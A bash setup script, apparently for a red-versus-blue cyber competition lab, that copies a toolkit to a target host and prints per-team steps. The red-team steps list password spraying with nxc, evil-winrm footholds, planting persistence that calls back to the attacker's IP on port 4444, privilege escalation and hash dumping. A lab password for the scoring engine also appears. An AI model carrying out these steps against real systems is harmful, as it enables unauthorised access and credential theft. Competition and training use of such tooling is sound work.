#!/usr/bin/env bash
# start.sh — one command to set up a round. Run this ON KALI, first thing.
#
#   bash start.sh blue            pull the kit, find targets, copy the kit to the PD, baseline and
#                                 patch it, then print your loop
#   bash start.sh red             pull, find targets, copy the kit to the PD, print the persistence
#                                 command with your IP filled in
#   bash start.sh refresh         just pull and re-discover
#   bash start.sh blue --dry      print the commands without running the remote ones
#   PD_USER=ftruman bash start.sh blue
#
# The PD account is whatever the packet announces for non-admins, and the password is the announced
# default. ssh will ask for it once per connection.

set -u
MODE="${1:-help}"
DRY=0
for a in "$@"; do [ "$a" = "--dry" ] && DRY=1; done
PD_USER="${PD_USER:-ftruman}"

cd "$(dirname "$0")" || exit 1

say() { printf '\n=== %s\n' "$*"; }
run() { if [ "$DRY" -eq 1 ]; then echo "   [dry] $*"; else eval "$@"; fi; }

if [ "$MODE" = "help" ]; then
  cat <<'EOF'
start.sh modes:
  bash start.sh blue      set up a blue round
  bash start.sh red       set up a red round
  bash start.sh refresh   pull the repo and re-run discovery

Options:  --dry        print commands only
          PD_USER=xyz  account to ssh into the PD with (default ftruman)
EOF
  exit 0
fi

say "1. pulling the kit"
if [ -d .git ]; then run "git pull --ff-only"; else echo "   (not a git repo, skipping)"; fi

say "2. finding the targets"
if [ ! -f ./targets.env ] || [ "$MODE" = "refresh" ]; then
  run "bash ./discover.sh"
else
  echo "   using existing ./targets.env (delete it to re-scan)"
fi
# shellcheck disable=SC1091
[ -f ./targets.env ] && . ./targets.env
PD_IP="${PD_IP:-CHANGEME}"
DC_IP="${DC_IP:-CHANGEME}"
SCORING_IP="${SCORING_IP:-172.16.10.250}"
WAZUH_IP="${WAZUH_IP:-172.16.10.254}"
MY_IP="$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | head -1 | cut -d/ -f1)"

say "3. what we found"
echo "   my kali : ${MY_IP:-unknown}"
echo "   PD      : $PD_IP"
echo "   DC      : $DC_IP"
echo "   scoring : https://$SCORING_IP:8443"
echo "   wazuh   : https://$WAZUH_IP"

[ "$MODE" = "refresh" ] && { echo; echo "refresh done."; exit 0; }

if [ "$PD_IP" = "CHANGEME" ]; then
  echo
  echo "[!] no PD found. Check the pod is up, or pass the subnet:"
  echo "    bash discover.sh 172.16.10.0/24"
  exit 1
fi

say "4. copying the kit to the PD ($PD_USER@$PD_IP)"
echo "   it will ask for the announced default password once"
run "ssh -o StrictHostKeyChecking=accept-new $PD_USER@$PD_IP 'mkdir -p /tmp/final-kit'"
run "scp -r -o StrictHostKeyChecking=accept-new ./red.sh ./blue.sh ./discover.sh ./red ./blue $PD_USER@$PD_IP:/tmp/final-kit/"

if [ "$MODE" = "blue" ]; then
  say "5. baseline and patch on the PD"
  run "ssh -t $PD_USER@$PD_IP 'cd /tmp/final-kit && bash blue.sh baseline'"
  run "ssh -t $PD_USER@$PD_IP 'cd /tmp/final-kit && sudo bash blue.sh patch'"

  say "6. you are set up. Then:"
  cat <<EOF
   a) scoring engine: https://$SCORING_IP:8443   (blueteam / twinpeaks1blue)
      SERVICES -> a service -> ACCOUNTS shows the login that check uses
   b) bring every scored service up:  nmap -Pn -p 0,21,22,80 $PD_IP
   c) every 2-3 minutes:
        ssh $PD_USER@$PD_IP 'cd /tmp/final-kit && bash blue.sh triage brief'
   d) when you find something:
        ssh -t $PD_USER@$PD_IP 'cd /tmp/final-kit && bash blue.sh sweep'            # dry run, screenshot
        ssh -t $PD_USER@$PD_IP 'cd /tmp/final-kit && bash blue.sh sweep --remove'
        ssh -t $PD_USER@$PD_IP 'cd /tmp/final-kit && sudo bash blue.sh evict --from <RED_IP> --apply'
   e) last 10 minutes: rotate accounts, update the scoring engine, verify the ports.
EOF

elif [ "$MODE" = "red" ]; then
  say "5. you are set up. Then:"
  cat <<EOF
   a) spray the announced default password against the user list:
        nxc ssh $PD_IP -u users.txt -p '<default>' --continue-on-success
        nxc smb $DC_IP -u users.txt -p '<default>' --continue-on-success
   b) foothold:  ssh <user>@$PD_IP    |    evil-winrm -i $DC_IP -u <user> -p '<pw>'
   c) plant five mechanisms on the PD (kit is already there):
        ssh -t <user>@$PD_IP 'cd /tmp/final-kit && bash red.sh plant $MY_IP 4444 <user>'
   d) escalate twice, with proof:
        ssh -t <user>@$PD_IP 'cd /tmp/final-kit && bash red.sh privesc'
   e) AD, from Kali:  bash red.sh recon $DC_IP <user> '<pw>' <domain> <ca-ip>
   f) last 5 minutes: takedowns, then dump whatever hashes you can reach.
   Your callback IP: $MY_IP
EOF
fi
